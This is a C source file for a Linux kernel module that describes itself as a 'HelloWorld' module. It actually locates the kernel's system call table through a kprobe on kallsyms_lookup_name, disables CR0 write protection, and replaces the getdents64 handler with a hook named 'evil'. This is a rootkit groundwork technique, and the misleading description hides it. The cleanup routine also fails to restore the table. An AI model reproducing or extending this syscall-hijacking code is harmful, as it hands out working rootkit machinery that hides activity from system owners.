#include <linux/init.h>   // included for __init and __exit macros
#include <linux/kernel.h> // included for KERN_INFO
#include <linux/module.h> // included for all kernel modules
#include <linux/kprobes.h> 

MODULE_LICENSE("GPL"); // The license  under which the module is distributed.
MODULE_AUTHOR("Girish Joshi"); // The original author of the module (VZ).
MODULE_DESCRIPTION(
    "HelloWorld Linux Kernel Module."); // The Description of the module.


typedef void ** (*kallsyms_lookup_name_pointer)(char*);
typedef asmlinkage ssize_t(*__x64_sys_getdents64_pointer)(int fd, void * dirp, size_t count);



static char symbol[KSYM_NAME_LEN] = "kallsyms_lookup_name";
__x64_sys_getdents64_pointer __x64_sys_getdents64_ptr;

static struct kprobe kp = {
	.symbol_name	= symbol,
};

typedef struct linux_dirent64 {
        long long      d_ino;    /* 64-bit inode number */
        long long      d_off;    /* 64-bit offset to next structure */
        unsigned short d_reclen; /* Size of this dirent */
        unsigned char  d_type;   /* File type */
        char           d_name[]; /* Filename (null-terminated) */
    } linux_dirent;




asmlinkage ssize_t evil(int fd, void * dirp, size_t count) {

  pr_info("Hijack completed ?! >:)\n");
  ssize_t ret = __x64_sys_getdents64_ptr(fd, dirp, count);;
  
  linux_dirent* evil_dirp;
  evil_dirp = (linux_dirent * )dirp;

  pr_info("ino_first = %llx\n", evil_dirp->d_ino);


  return ret;
};

static void ** leak_sys_call_table(void) {
  int ret = register_kprobe(&kp);
  // if (ret < 0) {
  //   pr_err("register_kprobe failed, returned %d\n", ret);
  //   return ret;
  // }
  pr_info("kallsyms_lookup_name = %llx\n", kp.addr);

  kallsyms_lookup_name_pointer to_call = (kallsyms_lookup_name_pointer)kp.addr;
  void ** addr = to_call("sys_call_table");
  return addr;
};

// This function defines what happens when this module is inserted into the
// kernel. ie. when you run insmod command.
static int __init hello_init(void) {
  void ** sys_call_table = leak_sys_call_table();
  
  __x64_sys_getdents64_ptr = *(sys_call_table + 217);

  asm volatile("mov %0,%%cr0": : "r" (read_cr0() & (~0x10000)));
  *(sys_call_table + 217) = &evil;
  asm volatile("mov %0,%%cr0": : "r" (read_cr0() | 0x10000));

  printk(KERN_INFO "Hello world!\n");
  return 0; // Non-zero return means that the module couldn't be loaded.
}



// This function defines what happens when this module is removed from the
// kernel. ie.when you run rmmod command.
static void __exit hello_cleanup(void) {
  printk(KERN_INFO "Cleaning up module.\n");
}

module_init(hello_init);    // Registers the __init function for the module.
module_exit(hello_cleanup); // Registers the __exit function for the module.
